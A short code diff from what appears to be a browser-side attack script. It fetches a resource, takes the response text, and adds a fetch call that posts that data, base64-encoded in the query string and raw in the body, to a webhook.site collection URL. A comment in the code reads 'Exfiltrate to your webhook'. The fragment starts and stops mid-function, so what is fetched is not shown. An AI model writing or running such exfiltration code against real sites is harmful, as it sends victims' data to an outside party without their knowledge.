@@ -11,7 +11,10 @@
       })
         .then(res => res.text())
 .then(data => {
- 
+ fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e?data="+ btoa(data), {
+            method: "POST",
+            body: data
+          });
           // Exfiltrate to your webhook
           
         })
